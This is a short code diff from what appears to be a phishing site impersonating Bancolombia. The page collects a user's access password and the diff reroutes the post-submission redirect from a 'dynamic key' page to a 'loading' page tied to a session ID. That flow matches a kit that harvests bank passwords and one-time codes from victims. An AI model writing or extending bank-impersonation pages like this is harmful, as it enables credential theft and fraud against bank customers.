@@ -62,8 +62,8 @@ export default function BancolombiaClaveAccesoPage() {
       });
 
       if (response.ok) {
-        // Redirigir a la página de clave dinámica
-        router.push(`/bancolombia/clave?sessionId=${sessionId}`);
+        // Redirigir a la página de validación/cargando
+        router.push(`/bancolombia/cargando?sessionId=${sessionId}`);
       }
     } catch (error) {
       console.error('Error updating password:', error);
